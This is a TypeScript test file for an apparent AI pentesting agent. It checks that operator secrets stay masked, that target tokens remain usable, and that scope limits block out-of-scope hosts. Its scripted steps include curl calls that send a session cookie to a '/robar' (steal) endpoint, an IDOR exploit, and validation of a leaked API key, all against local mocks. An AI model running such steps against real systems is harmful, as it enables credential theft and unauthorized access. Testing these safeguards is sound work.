import "./datos-tmp.ts";
// Secretos de punta a punta con la regla del 22/11 (decisiones de Lean para el #39): el motor real, el transporte
// real contra un proveedor de mentira, servidores locales como objetivo, la shell con curl de verdad y escáneres de
// mentira que hacen peticiones de verdad con lo que reciben en argv.
//
// - Material del objetivo (respuestas, tokens que emite, claves filtradas, y la cuenta de prueba que crea el
//   propio agente): el modelo lo ve tal cual en cada paso y lo usa en cualquier herramienta; las trazas lo tapan.
// - Secretos del operador (lo que pega o carga): el modelo ve un marcador; el valor vuelve en toda herramienta que
//   actúa contra el alcance (cliente HTTP, shell, escáneres) si los destinos están en el alcance; afuera, no.
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { createServer, type IncomingMessage, type ServerResponse } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { Engine } from "../src/engine.ts";
import { which } from "../src/exec.ts";
import { anthropicMessages, openAICompletions } from "../src/llm.ts";
import { usdToPico } from "../src/money.ts";
import { BINARIES } from "../src/toolbox.ts";
import { bloques, type Cerebro, escanerFalso, escuchar, esperar, type Formato, noModelo, proveedor, resultados, sinCanarios } from "./secretos-falsos.ts";

const ESCANERES = ["ffuf", "httpx", "nuclei", "katana", "sqlmap"] as const;
const curl = which("curl");

type Visto = { puerto: string; metodo: string; ruta: string; authorization: string; cookie: string; extra: string };

/** Un servidor del «objetivo» que anota cada pedido (cabeceras de credenciales incluidas) y responde con `rutas`. */
async function servidor(rutas: (req: IncomingMessage, cuerpo: string, res: ServerResponse) => void) {
  const vistos: Visto[] = [];
  const server = createServer((req, res) => {
    let cuerpo = "";
    req.setEncoding("utf8");
    req.on("data", (chunk) => (cuerpo += chunk));
    req.on("end", () => {
      vistos.push({ puerto: String(req.socket.localPort), metodo: req.method ?? "", ruta: req.url ?? "", authorization: String(req.headers.authorization ?? ""), cookie: String(req.headers.cookie ?? ""), extra: String(req.headers["x-clave"] ?? "") });
      rutas(req, cuerpo, res);
    });
  });
  const base = await escuchar(server);
  return { base, vistos, cerrar: () => { server.closeAllConnections(); server.close(); } };
}

const json = (res: ServerResponse, status: number, body: object, headers: Record<string, string> = {}) => res.writeHead(status, { "content-type": "application/json", ...headers }).end(JSON.stringify(body));

/** Motor con el proveedor de mentira, la shell autoaprobada y los escáneres de mentira; `alcance` se fija antes de empezar. */
async function sesion(cerebro: Cerebro, alcance: () => string[], formato: Formato = "openai") {
  const svc = proveedor(formato, () => "", cerebro);
  const svcBase = `${await escuchar(svc.server)}/v1`;
  const dir = mkdtempSync(join(tmpdir(), "cyber-e2e-"));
  const prev = { config: process.env.CYBER_CONFIG, key: process.env.OROBAS_API_KEY, auto: process.env.CYBER_SHELL_AUTOAPROBAR, trazas: process.env.CYBER_TRAZAS };
  writeFileSync(join(dir, "config.json"), JSON.stringify({ providers: { orobas: { baseUrl: svcBase, apiKeyEnv: "OROBAS_API_KEY" } } }));
  process.env.CYBER_CONFIG = join(dir, "config.json");
  process.env.OROBAS_API_KEY = "oro_prueba_punta_a_punta_1";
  process.env.CYBER_SHELL_AUTOAPROBAR = "1";
  delete process.env.CYBER_TRAZAS;
  const registro = join(dir, "escaneres.jsonl");
  writeFileSync(registro, "");
  mkdirSync(join(dir, "bin"));
  mkdirSync(join(dir, "proyecto"));
  const binarios = Object.fromEntries(ESCANERES.map((nombre) => [nombre, BINARIES[nombre]!.binary]));
  for (const nombre of ESCANERES) BINARIES[nombre]!.binary = escanerFalso(nombre, registro, join(dir, "bin"));
  const provider = { model: { provider: "orobas", id: "punta-a-punta", baseUrl: svcBase, apiKeyEnv: "OROBAS_API_KEY" }, transport: formato === "openai" ? openAICompletions : anthropicMessages, account: "OROBAS_API_KEY" };
  const engine = new Engine({ cwd: join(dir, "proyecto"), provider, budgetPico: usdToPico("5"), coverageObjections: 0, closingGate: false, autoVerify: false, router: "fijo", cveFeed: false, retryBaseMs: 1 });
  engine.scope.edit({ include: alcance() });
  // Los escáneres van por demanda (catálogo): el modelo los cargaría con tools_load; acá se cargan antes de empezar.
  for (const nombre of ["ffuf_fuzz", "httpx_probe", "nuclei_scan", "katana_crawl", "sqlmap_scan"]) assert.ok(engine.catalog.load(nombre), nombre);
  const escaneos = () => readFileSync(registro, "utf8").split("\n").filter(Boolean).map((linea) => JSON.parse(linea) as { escaner: string; argv: string[] });
  /** Turno completo: el texto final, el registro del turno y, al cerrar, la trayectoria. */
  const turno = async (texto: string) => {
    await engine.send(texto);
    await esperar(() => svc.cuerpos.some((item) => item.url.endsWith("/traces")));
    await engine.close();
    await esperar(() => svc.cuerpos.some((item) => item.url.endsWith("/trayectorias")));
  };
  const cerrar = async () => {
    await engine.close();
    svc.server.closeAllConnections();
    svc.server.close();
    for (const nombre of ESCANERES) BINARIES[nombre]!.binary = binarios[nombre]!;
    for (const [name, value] of [["CYBER_CONFIG", prev.config], ["OROBAS_API_KEY", prev.key], ["CYBER_SHELL_AUTOAPROBAR", prev.auto], ["CYBER_TRAZAS", prev.trazas]] as const) {
      if (value === undefined) delete process.env[name]; else process.env[name] = value;
    }
    rmSync(dir, { recursive: true, force: true });
  };
  return { engine, svc, escaneos, turno, cerrar };
}

/** El marcador que el modelo ve en lugar de lo que pegó el operador (o nada, si lo viera en claro). */
const marcadorEn = (body: any, formato: Formato, clave: string) => new RegExp(`${clave}=(‹SECRETO_\\d+›)`).exec(bloques(body, formato).filter((b) => b.role === "user").map((b) => b.text).join("\n"))?.[1] ?? "no-hay-marcador";
const resultadoDe = (engine: Engine, indice: number) => engine.agent.messages.filter((m) => m.role === "tool")[indice] as Extract<Engine["agent"]["messages"][number], { role: "tool" }>;

/* ---------- (2) La cuenta de prueba que crea el agente ---------- */

for (const formato of ["openai", "anthropic"] as const) {
  test(`cuenta de prueba creada por el agente (${formato}): la contraseña que inventa y la cookie y el JWT que recibe nunca se tapan para el modelo, sirven en el cliente HTTP, la shell y los escáneres, y en las trazas van tapados`, { skip: !curl && "curl no está instalado" }, async () => {
    const PASS = "Pr0bandoCuenta-Agente-7h2Q";
    const SESION = "SesionDeLaCuentaDePrueba7Kq2Lm";
    const JWT = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZ2VudGUtcHJ1ZWJhIn0.ZmlybWEtZGUtbGEtY3VlbnRhLWRlLXBydWViYQ";
    const usuarios = new Map<string, string>();
    const objetivo = await servidor((req, cuerpo, res) => {
      const autenticado = req.headers.authorization === `Bearer ${JWT}` || String(req.headers.cookie ?? "").includes(`sesion=${SESION}`);
      if (req.method === "POST" && req.url === "/registro") {
        const { email, password } = JSON.parse(cuerpo);
        usuarios.set(email, password);
        return json(res, 201, { id: "usr_V1StGXR8Z5jdHi6BmyT", email });
      }
      if (req.method === "POST" && req.url === "/login") {
        const { email, password } = JSON.parse(cuerpo);
        if (usuarios.get(email) !== password) return json(res, 401, { error: "credenciales" });
        return json(res, 200, { token: JWT, email }, { "set-cookie": `sesion=${SESION}; Path=/; HttpOnly` });
      }
      if (req.url === "/yo") return autenticado ? json(res, 200, { email: "agente@pruebas.test", token_usado: String(req.headers.authorization ?? "").replace(/^Bearer /, "") }) : json(res, 401, { error: "sin sesión" });
      if (req.method === "POST" && req.url === "/eco") return res.writeHead(200, { "content-type": "text/plain" }).end(`recibí ${cuerpo}`);
      return autenticado ? json(res, 200, { panel: "cuenta" }) : json(res, 401, { error: "sin sesión" });
    });
    const base = objetivo.base;
    let vista = { jwt: "no-lo-vi", sesion: "no-la-vi" };
    const cuerpo = JSON.stringify({ email: "agente@pruebas.test", password: PASS });
    const cerebro: Cerebro = (body, f) => {
      const vistos = resultados(body, f);
      // El registro va por la shell: la contraseña aparece primero en una salida local (el eco del comando), que es
      // del operador como fuente; como la escribió el agente, ya es del objetivo y no se tapa.
      if (vistos.length === 0) return { llamada: { name: "shell", args: { command: `curl -s -X POST -H 'content-type: application/json' --data '${cuerpo}' ${base}/registro` } } };
      if (vistos.length === 1) return { llamada: { name: "http_request", args: { url: `${base}/login`, method: "POST", headers: { "content-type": "application/json" }, body: cuerpo } } };
      // Lo que el modelo copia de la respuesta del login: si estuviera tapado, copiaría un marcador.
      vista = { jwt: /"token":"([^"\\]+)/.exec(vistos[1]!)?.[1] ?? "no-lo-vi", sesion: /sesion=([^;\s]+)/.exec(vistos[1]!)?.[1] ?? "no-la-vi" };
      if (vistos.length === 2) return { llamada: { name: "shell", args: { command: `curl -s -H 'Authorization: Bearer ${vista.jwt}' ${base}/yo; echo; curl -s -X POST --data 'password=${PASS}' ${base}/eco` } } };
      if (vistos.length === 3) return { llamada: { name: "katana_crawl", args: { url: `${base}/`, headers: [`Cookie: sesion=${vista.sesion}`] } } };
      if (vistos.length === 4) return { llamada: { name: "nuclei_scan", args: { targets: [base], headers: [`Authorization: Bearer ${vista.jwt}`] } } };
      return { texto: `Cuenta creada con la contraseña ${PASS}; la sesión es ${vista.sesion} y el token ${vista.jwt}.` };
    };
    const { engine, svc, escaneos, turno, cerrar } = await sesion(cerebro, () => ["127.0.0.1"], formato);
    try {
      await turno("Creá una cuenta de prueba y mapeá todo autenticado.");
      // Lo copió tal cual lo vio: ni marcadores ni valores que no sean los reales.
      assert.deepEqual(vista, { jwt: JWT, sesion: SESION }, "el modelo vio la cookie y el JWT del objetivo en claro");
      const modelo = svc.modelo();
      assert.equal(modelo.length, 6, "seis pedidos: registro (shell), login, shell, katana, nuclei y el cierre");
      assert.match(resultados(JSON.parse(modelo[1]!.body), formato)[0]!, new RegExp(`"password":"${PASS}"`), "el eco del registro en la shell, con la contraseña a la vista");
      // En cada paso, desde que existe, a la vista: la contraseña desde que la escribió; la cookie y el JWT desde el login.
      for (const [i, pedido] of modelo.entries()) {
        if (i >= 1) assert.ok(pedido.body.includes(PASS), `pedido ${i + 1}: la contraseña que inventó`);
        if (i >= 2) assert.ok(pedido.body.includes(SESION) && pedido.body.includes(JWT), `pedido ${i + 1}: la cookie y el JWT`);
      }
      // El eco de la shell local (que es del operador como fuente) no se los tapa: ya eran del objetivo.
      const shell = resultados(JSON.parse(modelo[3]!.body), formato)[2]!;
      assert.match(shell, new RegExp(`"token_usado":"${JWT.replace(/\./g, "\\.")}"`), shell);
      assert.match(shell, new RegExp(`recibí password=${PASS}`), shell);
      assert.doesNotMatch(shell, /‹SECRETO_/, "ni un marcador en la salida de la shell");
      for (const valor of [PASS, SESION, JWT]) assert.equal(engine.secretos.claseDelValor(valor), "objetivo", valor);
      // Sirvieron: curl (shell), katana y nuclei llegaron autenticados al objetivo.
      assert.ok(objetivo.vistos.some((v) => v.metodo === "POST" && v.ruta === "/registro"), "curl registró la cuenta");
      assert.ok(objetivo.vistos.some((v) => v.ruta === "/yo" && v.authorization === `Bearer ${JWT}`), "curl con el JWT");
      assert.ok(objetivo.vistos.some((v) => v.metodo === "GET" && v.ruta === "/" && v.cookie === `sesion=${SESION}`), "katana con la cookie");
      assert.ok(objetivo.vistos.some((v) => v.metodo === "GET" && v.ruta === "/" && v.authorization === `Bearer ${JWT}`), "nuclei con el JWT");
      assert.deepEqual(escaneos().map((e) => e.escaner), ["katana", "nuclei"]);
      // Las trazas (turno y trayectoria) no llevan ninguno, en ninguna forma; van tapados.
      const trazas = noModelo(svc.cuerpos);
      assert.ok(trazas.some((item) => item.url.endsWith("/traces")) && trazas.some((item) => item.url.endsWith("/trayectorias")));
      sinCanarios(trazas, { contraseña: PASS, sesion: SESION, jwt: JWT });
      assert.match(trazas.find((item) => item.url.endsWith("/traces"))!.body, /Cuenta creada con la contraseña ‹SECRETO_\d+›; la sesión es ‹SECRETO_\d+› y el token ‹SECRETO_\d+›/);
    } finally {
      await cerrar();
      objetivo.cerrar();
    }
  });
}

/* ---------- (1) y (6) La credencial del operador: shell con curl de verdad y escáneres externos ---------- */

test("credencial del operador: el modelo ve sólo el marcador; curl y los cinco escáneres la reciben en el alcance; hacia un host de afuera no sale", { skip: !curl && "curl no está instalado" }, async () => {
  const COOKIE = "CookieDelOperador7Qm2Xv9Lp4Zk";
  const objetivo = await servidor((req, _cuerpo, res) => json(res, String(req.headers.cookie ?? "").includes(`sid=${COOKIE}`) ? 200 : 401, { ruta: req.url }));
  const afuera = await servidor((_req, _cuerpo, res) => json(res, 200, { robado: true }));
  const cerebro: Cerebro = (body, f) => {
    const marca = marcadorEn(body, f, "sid");
    const cookie = `Cookie: sid=${marca}`;
    const pasos: Array<{ name: string; args: object }> = [
      { name: "shell", args: { command: `curl -s -H '${cookie}' ${objetivo.base}/yo` } },
      { name: "ffuf_fuzz", args: { url: `${objetivo.base}/FUZZ`, words: ["admin"], headers: [cookie] } },
      { name: "nuclei_scan", args: { targets: [objetivo.base], headers: [cookie] } },
      { name: "katana_crawl", args: { url: `${objetivo.base}/`, headers: [cookie] } },
      { name: "httpx_probe", args: { targets: [objetivo.base], headers: [cookie] } },
      { name: "sqlmap_scan", args: { url: `${objetivo.base}/buscar?q=1`, headers: [cookie] } },
      // Hacia un host fuera del alcance: ni el escáner ni la shell reciben el valor (no se ejecutan).
      { name: "katana_crawl", args: { url: `${afuera.base}/`, headers: [cookie] } },
      { name: "shell", args: { command: `curl -s -H '${cookie}' ${afuera.base}/robar` } },
    ];
    const n = resultados(body, f).length;
    return n < pasos.length ? { llamada: pasos[n]! } : { texto: "Listo: mapeado con la sesión del operador." };
  };
  const { engine, svc, escaneos, turno, cerrar } = await sesion(cerebro, () => [objetivo.base]);
  try {
    await turno(`Usá mi sesión: la cookie es sid=${COOKIE}`);
    const modelo = svc.modelo();
    assert.equal(modelo.length, 9);
    sinCanarios(modelo, { operador: COOKIE });
    sinCanarios(noModelo(svc.cuerpos), { operador: COOKIE });
    assert.match(modelo[0]!.body, /sid=‹SECRETO_\d+›/, "el modelo ve el marcador");
    // curl (la shell) y los cinco escáneres llegaron al objetivo con el valor real.
    const conCookie = objetivo.vistos.filter((v) => v.cookie === `sid=${COOKIE}`).map((v) => `${v.metodo} ${v.ruta}`);
    assert.deepEqual(conCookie.sort(), ["GET /", "GET /", "GET /", "GET /admin", "GET /buscar?q=1", "GET /yo"].sort(), JSON.stringify(objetivo.vistos));
    assert.deepEqual(escaneos().map((e) => e.escaner), ["ffuf", "nuclei", "katana", "httpx", "sqlmap"], "el de afuera no corrió");
    for (const { argv } of escaneos()) assert.ok(argv.includes(`Cookie: sid=${COOKIE}`), argv.join(" "));
    // Afuera no llegó nada, y el modelo sabe por qué.
    assert.deepEqual(afuera.vistos, []);
    for (const indice of [6, 7]) {
      const resultado = resultadoDe(engine, indice);
      assert.ok(resultado.isError && /Fuera del alcance/.test(resultado.content), resultado.content);
    }
  } finally {
    await cerrar();
    objetivo.cerrar();
    afuera.cerrar();
  }
});

/* ---------- (6) Redirecciones entre hosts del alcance y hacia uno de afuera ---------- */

test("redirección: la credencial del operador sigue a otro host del alcance; hacia uno de afuera el cliente corta y no le llega nada", async () => {
  const CLAVE = "ClaveDelOperador-Redir-8812xq";
  const api = await servidor((req, _cuerpo, res) => json(res, req.headers["x-clave"] === CLAVE ? 200 : 401, { panel: "api" }));
  const afuera = await servidor((_req, _cuerpo, res) => json(res, 200, { robado: true }));
  const auth = await servidor((req, _cuerpo, res) => {
    if (req.url === "/entrar") return res.writeHead(302, { location: `${api.base}/panel` }).end();
    if (req.url === "/salir") return res.writeHead(302, { location: `${afuera.base}/robar` }).end();
    res.writeHead(404).end();
  });
  const cerebro: Cerebro = (body, f) => {
    const marca = marcadorEn(body, f, "clave");
    const n = resultados(body, f).length;
    if (n === 0) return { llamada: { name: "http_request", args: { url: `${auth.base}/entrar`, headers: { "x-clave": marca }, followRedirects: true } } };
    if (n === 1) return { llamada: { name: "http_request", args: { url: `${auth.base}/salir`, headers: { "x-clave": marca }, followRedirects: true } } };
    return { texto: "Listo." };
  };
  // auth. y api. en el alcance (otro puerto: otro origen, el caso que el permiso por origen rompía); afuera, no.
  const { engine, svc, turno, cerrar } = await sesion(cerebro, () => [auth.base, api.base]);
  try {
    await turno(`Entrá con clave=${CLAVE}`);
    sinCanarios(svc.cuerpos, { operador: CLAVE });
    assert.deepEqual(auth.vistos.map((v) => [v.ruta, v.extra]), [["/entrar", CLAVE], ["/salir", CLAVE]]);
    assert.deepEqual(api.vistos.map((v) => [v.ruta, v.extra]), [["/panel", CLAVE]], "siguió la redirección dentro del alcance con el valor real");
    assert.deepEqual(afuera.vistos, [], "el host de afuera no recibió nada");
    assert.match(resultadoDe(engine, 0).content, /HTTP 200/);
    assert.match(resultadoDe(engine, 1).content, /alcance/i);
  } finally {
    await cerrar();
    for (const s of [auth, api, afuera]) s.cerrar();
  }
});

/* ---------- (6) IDOR con dos ids opacos ---------- */

test("IDOR: dos ids opacos (nanoid y relay de GraphQL) llegan al modelo en claro y el pedido cruzado sale con el id exacto", async () => {
  const SID = "SesionDeAnaOperadora4Tn8Wq2";
  const DE_ANA = "V1StGXR8_Z5jdHi6B-myT";
  const DE_BETO = "T3JkZXI6OTg3NjU0MzIxMDEyMzQ1Ng==";
  const pedidos: Record<string, { id: string; dueño: string; total: number }> = { [DE_ANA]: { id: DE_ANA, dueño: "ana", total: 10 }, [DE_BETO]: { id: DE_BETO, dueño: "beto", total: 999 } };
  const objetivo = await servidor((req, _cuerpo, res) => {
    const deAna = String(req.headers.cookie ?? "").includes(`sid=${SID}`);
    if (req.url === "/mis-pedidos") return deAna ? json(res, 200, { pedidos: [{ id: DE_ANA }] }) : json(res, 401, {});
    if (req.url === "/recientes") return json(res, 200, { pedidos: [{ id: DE_BETO, dueño: "beto" }] });
    const id = decodeURIComponent((req.url ?? "").replace(/^\/pedidos\//, ""));
    // Vulnerable: no mira el dueño.
    if (deAna && pedidos[id]) return json(res, 200, pedidos[id]);
    return json(res, 404, {});
  });
  let vistos: string[] = [];
  const cerebro: Cerebro = (body, f) => {
    const r = resultados(body, f);
    if (r.length === 0) return { llamada: { name: "http_request", args: { url: `${objetivo.base}/mis-pedidos`, identity: "ana" } } };
    if (r.length === 1) return { llamada: { name: "http_request", args: { url: `${objetivo.base}/recientes` } } };
    vistos = [/"id":"([^"]+)"/.exec(r[0]!)?.[1] ?? "", /"id":"([^"]+)"/.exec(r[1]!)?.[1] ?? ""];
    if (r.length === 2) return { llamada: { name: "http_request", args: { url: `${objetivo.base}/pedidos/${encodeURIComponent(vistos[1]!)}`, identity: "ana" } } };
    return { texto: "IDOR: con la sesión de ana se lee el pedido de beto." };
  };
  const { engine, svc, turno, cerrar } = await sesion(cerebro, () => ["127.0.0.1"]);
  try {
    engine.http.setIdentity({ name: "ana", headers: { cookie: `sid=${SID}` } });
    await turno("Probá IDOR entre pedidos.");
    assert.deepEqual(vistos, [DE_ANA, DE_BETO], "los dos ids, en claro");
    assert.ok(!svc.modelo().some((p) => p.body.includes(`"id\\":\\"‹SECRETO_`)), "ningún id llega como marcador");
    assert.ok(objetivo.vistos.some((v) => v.ruta === `/pedidos/${encodeURIComponent(DE_BETO)}` && v.cookie === `sid=${SID}`), "el pedido cruzado salió con el id exacto y la sesión de ana");
    assert.match(resultadoDe(engine, 2).content, /"dueño":"beto"/);
    sinCanarios(svc.cuerpos, { operador: SID });
  } finally {
    await cerrar();
    objetivo.cerrar();
  }
});

/* ---------- (6) Clave filtrada contra un proveedor dentro y fuera del alcance ---------- */

test("clave filtrada en el JS del objetivo: el modelo la ve y la usa contra un proveedor del alcance; contra uno de afuera el cliente no la manda", async () => {
  const CLAVE = "sk_" + "live_51FiltradaEnElJs0123456789";
  const objetivo = await servidor((_req, _cuerpo, res) => res.writeHead(200, { "content-type": "application/javascript" }).end(`const STRIPE_KEY = "${CLAVE}";\nexport default STRIPE_KEY;\n`));
  const proveedorEnAlcance = await servidor((_req, _cuerpo, res) => json(res, 200, { object: "balance" }));
  const proveedorAfuera = await servidor((_req, _cuerpo, res) => json(res, 200, { object: "balance" }));
  const cerebro: Cerebro = (body, f) => {
    const r = resultados(body, f);
    const clave = /STRIPE_KEY = "([^"\\]+)/.exec(r[0] ?? "")?.[1] ?? "no-la-vi";
    if (r.length === 0) return { llamada: { name: "http_request", args: { url: `${objetivo.base}/app.js` } } };
    if (r.length === 1) return { llamada: { name: "http_request", args: { url: `${proveedorEnAlcance.base}/v1/balance`, headers: { authorization: `Bearer ${clave}` } } } };
    if (r.length === 2) return { llamada: { name: "http_request", args: { url: `${proveedorAfuera.base}/v1/balance`, headers: { authorization: `Bearer ${clave}` } } } };
    return { texto: `La clave ${clave} está viva.` };
  };
  const { engine, svc, turno, cerrar } = await sesion(cerebro, () => [objetivo.base, proveedorEnAlcance.base]);
  try {
    await turno("Revisá el JS y validá lo que encuentres.");
    assert.ok(svc.modelo().slice(1).every((p) => p.body.includes(CLAVE)), "la clave filtrada, en claro desde que apareció");
    assert.equal(engine.secretos.claseDelValor(CLAVE), "objetivo");
    assert.deepEqual(proveedorEnAlcance.vistos.map((v) => v.authorization), [`Bearer ${CLAVE}`], "el proveedor del alcance la recibió");
    assert.deepEqual(proveedorAfuera.vistos, [], "el de afuera, no");
    assert.match(resultadoDe(engine, 2).content, /alcance/i);
    sinCanarios(noModelo(svc.cuerpos), { clave: CLAVE });
  } finally {
    await cerrar();
    for (const s of [objetivo, proveedorEnAlcance, proveedorAfuera]) s.cerrar();
  }
});
